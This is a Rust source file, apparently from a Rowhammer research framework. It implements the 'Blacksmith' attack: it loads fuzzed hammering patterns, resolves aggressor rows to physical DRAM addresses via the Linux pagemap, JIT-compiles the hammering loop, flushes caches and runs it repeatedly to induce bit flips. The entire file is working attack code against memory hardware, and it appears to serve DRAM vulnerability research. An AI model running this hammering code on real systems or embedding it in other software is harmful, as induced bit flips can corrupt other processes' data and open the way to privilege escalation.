use crate::jitter::{CodeJitter, Jitter, Program};
use itertools::Itertools;
use log::{debug, error, info, trace, warn};
use rand::Rng;
use serde::Deserialize;
use serde_with::serde_as;
use std::arch::asm;
use std::arch::x86_64::{__rdtscp, _mm_mfence};
use std::fmt::Debug;
use std::hash::Hash;
use std::time::Instant;
use std::{collections::HashMap, fs::File, io::BufReader};
use swage_core::hammerer::Hammering;
use swage_core::memory::{
    AggressorPtr, BytePointer, ConsecBlocks, DRAMAddr, LinuxPageMap, MemConfiguration,
    VirtToPhysResolver,
};
use swage_core::util;
use swage_core::util::{CL_SIZE, GroupBy, Size::MB};
use swage_core::victim::HammerVictimError;
use thiserror::Error;
#[cfg(feature = "iperf")]
use {
    perfcnt::linux::PerfCounterBuilderLinux as Builder,
    perfcnt::{AbstractPerfCounter, PerfCounter},
};

/// Represents an aggressor row identifier in a Rowhammer pattern.
///
/// Aggressors are rows that are repeatedly accessed to induce bit flips
/// in nearby victim rows.
#[derive(Deserialize, Debug, Hash, PartialEq, Eq, Clone, Copy)]
pub struct Aggressor(u64);

/// Represents a detected bit flip in a memory cell.
#[derive(Deserialize, Debug, Clone)]
#[allow(dead_code)]
struct BitFlip {
    /// DRAM address where the bit flip occurred
    dram_addr: DRAMAddr,
    /// Bitmask indicating which bit flipped
    bitmask: u8,
    /// Data value after the flip
    data: u8,
}

/// Maps aggressor row identifiers to physical DRAM addresses.
///
/// Used to map Blacksmith patterns to specific memory regions
/// during attack execution.
#[serde_as]
#[derive(Deserialize, Debug, Clone)]
pub struct PatternAddressMapper {
    /// Mapping UUID
    pub id: String,
    /// Minimum row number in this mapping
    //min_row: usize,
    /// Maximum row number in this mapping
    //max_row: usize,
    /// Bank number for this mapping
    //bank_no: usize,
    /// Map from aggressor IDs to their DRAM addresses
    #[serde_as(as = "Vec<(_, _)>")]
    aggressor_to_addr: HashMap<Aggressor, DRAMAddr>,
    /// Bit flips detected during fuzzing
    bit_flips: Vec<Vec<BitFlip>>,
    /// JIT compiler for hammering code
    code_jitter: CodeJitter,
}

impl PatternAddressMapper {
    /// Translates aggressor identifiers to virtual addresses.
    ///
    /// # Arguments
    ///
    /// * `aggressors` - Aggressor row identifiers
    /// * `base_msb` - Base address for virtual address calculation
    /// * `mem_config` - DRAM configuration for address translation
    ///
    /// # Returns
    ///
    /// Virtual addresses corresponding to the aggressors
    pub fn get_hammering_addresses(
        &self,
        aggressors: &[Aggressor],
        base_msb: AggressorPtr,
        mem_config: MemConfiguration,
    ) -> Vec<AggressorPtr> {
        aggressors
            .iter()
            .map(|agg| self.aggressor_to_addr[agg].to_virt(base_msb, mem_config))
            .collect()
    }

    /// Groups aggressors by memory block prefix.
    ///
    /// Used for pattern relocation to organize aggressors by their
    /// target memory block.
    ///
    /// # Arguments
    ///
    /// * `mem_config` - DRAM configuration
    /// * `block_shift` - Block size as log2 value
    ///
    /// # Returns
    ///
    /// Map from block prefix to aggressors in that block
    pub fn aggressor_sets(
        &self,
        mem_config: MemConfiguration,
        block_shift: usize,
    ) -> HashMap<usize, Vec<Aggressor>> {
        // find mapping classes
        let addrs: &HashMap<Aggressor, DRAMAddr> = &self.aggressor_to_addr;

        let addrs_vec = addrs.iter().collect::<Vec<_>>();

        // group aggressors by prefix
        addrs_vec
            .group_by(|(_, addr)| {
                #[allow(clippy::zero_ptr)]
                let virt = addr.to_virt(0 as *const u8, mem_config) as usize;
                virt >> block_shift
            })
            .into_iter()
            .map(|(key, group)| (key, group.into_iter().map(|(aggr, _)| *aggr).collect()))
            .collect()
    }

    /// Relocates aggressor addresses to specific memory blocks.
    ///
    /// # Arguments
    ///
    /// * `aggressors` - Aggressor identifiers to relocate
    /// * `mem_config` - DRAM configuration
    /// * `block_shift` - Block size as log2 value
    /// * `memory` - Target memory blocks
    ///
    /// # Returns
    ///
    /// Relocated aggressor virtual addresses
    ///
    /// # Errors
    ///
    /// Returns error if physical address lookup fails
    fn get_hammering_addresses_relocate(
        &self,
        aggressors: &[Aggressor],
        mem_config: MemConfiguration,
        block_shift: usize,
        memory: &ConsecBlocks,
    ) -> Vec<AggressorPtr> {
        info!("Relocating aggressors with shift {}", block_shift);
        let block_size = 1 << block_shift;
        let addrs = &self.aggressor_to_addr;
        let sets = self.aggressor_sets(mem_config, block_shift);

        let mut base_lookup: HashMap<Aggressor, usize> = HashMap::new();
        for (idx, (base, group)) in sets.iter().enumerate() {
            debug!("Index/Base/Group: {}, {}, {:?}", idx, base, group);
            for aggr in group {
                base_lookup.insert(*aggr, idx);
            }
        }
        debug!("{:?}", base_lookup);

        assert_eq!(sets.len() * block_size, memory.len());

        let mut aggrs_relocated = vec![];
        let mut pagemap = match LinuxPageMap::new() {
            Ok(pagemap) => Some(pagemap),
            Err(e) => {
                debug!("Failed to open PageMap: {}", e);
                None
            }
        };
        for agg in aggressors {
            let base_idx = base_lookup[agg];
            let addr = &addrs[agg];
            #[allow(clippy::zero_ptr)]
            let virt_offset = addr.to_virt(0 as *const u8, mem_config);
            let virt_offset = virt_offset as u64 & ((1 << block_shift) - 1);
            assert!(virt_offset < block_size as u64); // check if virt is within block. This should usually hold, but you never know amirite?
            let base = memory.addr(base_idx * block_size) as u64;
            let relocated = memory.addr(base_idx * block_size + virt_offset as usize) as *const u8;
            if let Some(pagemap) = &mut pagemap {
                let p = pagemap.get_phys(relocated as u64);
                match p {
                    Ok(p) => {
                        let phys = DRAMAddr::from_virt(p.into(), &mem_config);
                        debug!(
                            "Relocate {:?} to {:?} (0x{:x}), phys {:?} ({:p}), base: 0x{:x}, base_idx {}",
                            addr,
                            DRAMAddr::from_virt(relocated, &mem_config),
                            relocated as u64,
                            phys,
                            p,
                            base,
                            base_idx
                        );
                    }
                    Err(_) => debug!(
                        "Relocate {:?} to {:?} (0x{:x}), base: 0x{:x}, base_idx {}",
                        addr,
                        DRAMAddr::from_virt(relocated, &mem_config),
                        relocated as u64,
                        base,
                        base_idx
                    ),
                }
            }
            aggrs_relocated.push(relocated);
        }
        aggrs_relocated
    }

    /// Returns the total number of bit flips in this pattern mapping.
    pub fn count_bitflips(&self) -> usize {
        self.bit_flips.iter().map(|b| b.len()).sum()
    }
}

/// Container for Blacksmith fuzzing results.
/// Container for Blacksmith fuzzing results.
#[derive(Deserialize, Debug)]
pub struct FuzzSummary {
    /// All discovered hammering patterns
    pub hammering_patterns: Vec<HammeringPattern>,
}

/// A Blacksmith hammering pattern discovered through fuzzing.
///
/// Contains aggressor access sequences and address mappings that
/// successfully induced bit flips during fuzzing.
#[derive(Deserialize, Debug, Clone)]
pub struct HammeringPattern {
    /// Unique identifier for this pattern
    pub id: String,
    //base_period: i32,
    //max_period: usize,
    /// Total number of row activations in this pattern
    total_activations: u32,
    /// Number of DRAM refresh intervals
    num_refresh_intervals: u32,
    //is_location_dependent: bool,
    /// Aggressor row access sequence
    pub access_ids: Vec<Aggressor>,
    //agg_access_patterns: Vec<AggressorAccessPattern>,
    /// Address mappings for this pattern
    pub address_mappings: Vec<PatternAddressMapper>,
    //code_jitter: CodeJitter,
}

/// Errors that can occur when loading Blacksmith patterns from JSON.
#[derive(Debug, Error)]
pub enum PatternLoadError {
    /// I/O error reading pattern file
    #[error(transparent)]
    Io(#[from] std::io::Error),
    /// JSON parsing error
    #[error(transparent)]
    Json(#[from] serde_json::Error),
    /// Pattern with specified ID not found
    #[error("Did not find pattern with id {0}")]
    NotFound(String),
}

impl HammeringPattern {
    /// Loads all patterns from a Blacksmith JSON file.
    ///
    /// # Arguments
    ///
    /// * `json_filename` - Path to the Blacksmith fuzzing results JSON file
    ///
    /// # Errors
    ///
    /// Returns error if file cannot be read or parsed
    pub fn load_patterns(json_filename: &str) -> Result<Vec<HammeringPattern>, PatternLoadError> {
        let f = File::open(json_filename)?;
        let reader = BufReader::new(f);
        let patterns: FuzzSummary = serde_json::from_reader(reader)?;
        Ok(patterns.hammering_patterns)
    }

    /// Load pattern with ID `pattern_id` from `json_filename`
    pub fn load_pattern_from_json(
        json_filename: &str,
        pattern_id: &str,
    ) -> Result<HammeringPattern, PatternLoadError> {
        let patterns = HammeringPattern::load_patterns(json_filename)?;
        patterns
            .into_iter()
            .find(|p| pattern_id.eq(&p.id))
            .ok_or_else(|| PatternLoadError::NotFound(pattern_id.into()))
    }
}

impl HammeringPattern {
    /// Finds the address mapping with the most bit flips.
    ///
    /// # Returns
    ///
    /// The most effective mapping, or None if no mappings exist
    pub fn determine_most_effective_mapping(&self) -> Option<PatternAddressMapper> {
        self.address_mappings
            .iter()
            .max_by_key(|m| m.count_bitflips())
            .cloned()
    }

    /// Finds an address mapping by its identifier.
    ///
    /// # Arguments
    ///
    /// * `mapping_id` - Identifier of the mapping to find
    ///
    /// # Returns
    ///
    /// The matching mapping, or None if not found
    pub fn find_mapping(&self, mapping_id: &str) -> Option<PatternAddressMapper> {
        self.address_mappings
            .iter()
            .find(|m| m.id == mapping_id)
            .cloned()
    }
}

/// Number of hammering attempts to perform.
#[derive(Copy, Clone)]
pub struct Attempts(u32);

/// Block size shift for memory alignment.
#[derive(Copy, Clone)]
pub struct BlockShift(usize);

/// Blacksmith Rowhammer attack implementation.
///
/// Executes JIT-compiled hammering patterns discovered through fuzzing.
pub struct Blacksmith {
    /// JIT-compiled hammering program
    program: Program,
    /// Number of hammering attempts
    attempts: Attempts,
    /// Cache flush addresses
    flush_lines: Vec<usize>,
}

impl Blacksmith {
    /// Creates a new Blacksmith hammerer.
    ///
    /// JIT-compiles the pattern and prepares it for execution.
    ///
    /// # Arguments
    ///
    /// * `mem_config` - DRAM configuration
    /// * `pattern` - Hammering pattern to execute
    /// * `mapping` - Address mapping for the pattern
    /// * `block_shift` - Memory block alignment
    /// * `memory` - Target memory blocks
    /// * `attempts` - Number of hammering attempts
    pub fn new(
        mem_config: MemConfiguration,
        pattern: &HammeringPattern,
        mapping: &PatternAddressMapper,
        block_shift: BlockShift,
        memory: &ConsecBlocks, // TODO change to dyn BytePointer after updating hammer_log_cb
        attempts: Attempts,
    ) -> Self {
        let flush_buf: *mut u8 = util::mmap(std::ptr::null_mut(), MB(1024).bytes());
        let flush_lines = (0..MB(1024).bytes())
            .step_by(CL_SIZE)
            .map(|offset| unsafe { flush_buf.byte_add(offset) as usize })
            .collect_vec();

        info!("Using pattern {}", pattern.id);
        info!("Using mapping {}", mapping.id);

        let hammer_log_cb = |action: &str, addr: *const u8| {
            let block_idx = memory.blocks.iter().find_position(|base| {
                (addr as u64) >= base.ptr() as u64
                    && (addr as u64) <= (base.addr(base.len() - 1) as u64)
            });
            let found = block_idx.is_some();
            if !found {
                error!("OUT OF BOUNDS ACCESS: {} {:?}", action, addr);
            }
            let paddr = LinuxPageMap::new()
                .expect("pagemap open")
                .get_phys(addr as u64);
            match paddr {
                Ok(paddr) => {
                    let dram = DRAMAddr::from_virt(paddr.into(), &mem_config);
                    trace!(
                        "{:>06} {:02},{:04},{:p},{}",
                        action,
                        dram.bank,
                        dram.row,
                        paddr,
                        block_idx.map(|(idx, _)| idx).unwrap_or(usize::MAX)
                    )
                }
                Err(e) => warn!("Failed to get physical address: {}", e),
            };
        };

        let acts_per_tref = pattern.total_activations / pattern.num_refresh_intervals;

        let hammering_addrs = mapping.get_hammering_addresses_relocate(
            &pattern.access_ids,
            mem_config,
            block_shift.0,
            memory,
        );
        let num_accessed_addrs = hammering_addrs
            .iter()
            .map(|x| (*x as usize) & !0xFFF)
            .unique()
            .count();

        info!("Pattern contains {} accessed addresses", num_accessed_addrs);

        let program = mapping
            .code_jitter
            .jit(acts_per_tref as u64, &hammering_addrs, &hammer_log_cb)
            .expect("JIT failed");
        if cfg!(feature = "jitter_dump") {
            program
                .write("hammer_jit.o")
                .expect("failed to write function to disk");
        }

        Self {
            program,
            attempts,
            flush_lines,
        }
    }
}

impl Drop for Blacksmith {
    fn drop(&mut self) {
        unsafe {
            let flush_buf = self.flush_lines[0] as *mut u8;
            util::munmap(flush_buf, MB(1024).bytes());
        }
    }
}

impl Blacksmith {
    fn do_random_accesses(&self, rows: &[AggressorPtr], wait_until_start_hammering_us: u128) {
        let start = Instant::now();
        let mut _x = 0;
        while start.elapsed().as_micros() < wait_until_start_hammering_us {
            for &row in rows {
                _x = std::hint::black_box(unsafe { std::ptr::read_volatile(row) });
            }
        }
    }
}

impl Hammering for Blacksmith {
    type Error = HammerVictimError;
    fn hammer(&self) -> Result<(), Self::Error> {
        info!("Hammering with {} attempts", self.attempts.0);
        let mut rng = rand::rng();
        const REF_INTERVAL_LEN_US: f32 = 7.8; // check if can be derived from pattern?
        #[cfg(feature = "iperf")]
        {
            let mut pc_miss: PerfCounter =
                Builder::from_hardware_event(perfcnt::linux::HardwareEventType::CacheMisses)
                    .on_cpu(1)
                    .for_pid(std::process::id() as i32)
                    .finish()
                    .expect("Could not create counter");
            let mut pc_ref: PerfCounter =
                Builder::from_hardware_event(perfcnt::linux::HardwareEventType::CacheReferences)
                    .on_cpu(1)
                    .for_pid(std::process::id() as i32)
                    .finish()
                    .expect("Could not create counter");
        }
        for attempt in 0..self.attempts.0 {
            #[cfg(feature = "iperf")]
            {
                pc_miss.reset().expect("Could not reset counter");
                pc_ref.reset().expect("Could not reset counter");
            }
            let wait_until_start_hammering_refs = rng.random_range(10..128); // range 10..128 is hard-coded in FuzzingParameterSet
            let wait_until_start_hammering_us =
                wait_until_start_hammering_refs as f32 * REF_INTERVAL_LEN_US;
            let random_rows = vec![];
            trace!(
                "do random memory accesses for {} us before running jitted code",
                wait_until_start_hammering_us as u128
            );
            // before hammering: clear cache
            debug!("Flush {} lines", self.flush_lines.len());
            for &line in self.flush_lines.iter() {
                unsafe {
                    // TODO why does clflush increase flippability? Replace with nops
                    asm!("clflushopt [{}]", in(reg) line as *const u8);
                }
            }
            unsafe { _mm_mfence() };
            self.do_random_accesses(&random_rows, wait_until_start_hammering_us as u128);
            unsafe {
                let mut aux = 0;
                _mm_mfence();
                let time = __rdtscp(&mut aux);
                _mm_mfence();
                #[cfg(feature = "iperf")]
                {
                    pc_miss.start().expect("Could not start counter");
                    pc_ref.start().expect("Could not start counter");
                }
                let result = self.program.call();
                _mm_mfence();
                #[cfg(feature = "iperf")]
                {
                    pc_miss.stop().expect("Could not stop counter");
                    pc_ref.stop().expect("Could not stop counter");
                }
                let time = __rdtscp(&mut aux) - time;
                _mm_mfence();
                debug!(
                    "jit call done: 0x{:02X} (attempt {}, time {})",
                    result, attempt, time
                );
            }
            #[cfg(feature = "iperf")]
            {
                let misses = pc_miss.read().expect("Could not read counter");
                let refs = pc_ref.read().expect("Could not read counter");
                debug!(
                    "LL misses: {}/{} = {:.03}",
                    misses,
                    refs,
                    misses as f64 / refs as f64
                );
            }
        }
        info!("Hammering done.");
        Ok(())
    }
}

impl From<u32> for Attempts {
    fn from(u: u32) -> Self {
        Attempts(u)
    }
}

impl From<usize> for BlockShift {
    fn from(u: usize) -> Self {
        BlockShift(u)
    }
}
